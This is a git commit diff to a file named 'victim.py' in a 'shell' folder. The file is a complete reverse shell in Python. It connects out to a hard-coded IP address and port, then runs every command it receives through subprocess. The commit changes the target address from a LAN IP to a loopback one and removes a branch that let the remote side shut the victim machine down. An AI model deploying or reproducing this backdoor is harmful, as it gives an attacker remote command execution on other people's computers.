ff7de84f9c17c00de64890b4387d7a2b8514724a
Phoenix <158185295+ZombieGeeK0@users.noreply.github.com>
2024-05-05 11:32:04 +0200

    Update victim.py

--- shell/victim.py
+++ shell/victim.py
@@ -1,12 +1,11 @@
 import subprocess,socket,os
-H,P='192.168.1.132',8080
+H,P='127.0.1.1',8080
 s=socket.socket()
 s.connect((H,P))
 while True:
- d=s.recv(1024)
- if not d:break
- c=d.decode().strip()
- if c=='exit'or c=='apagar':break
- elif c=='apagar':os.system('shutdown /s /t 0'if os.name=='nt'else'shutdown -h 0')
- o=subprocess.getoutput(c)
+    d=s.recv(1024)
+    if not d:break
+    c=d.decode().strip()
+    if c=='exit':break
+    o=subprocess.getoutput(c)
 s.close()
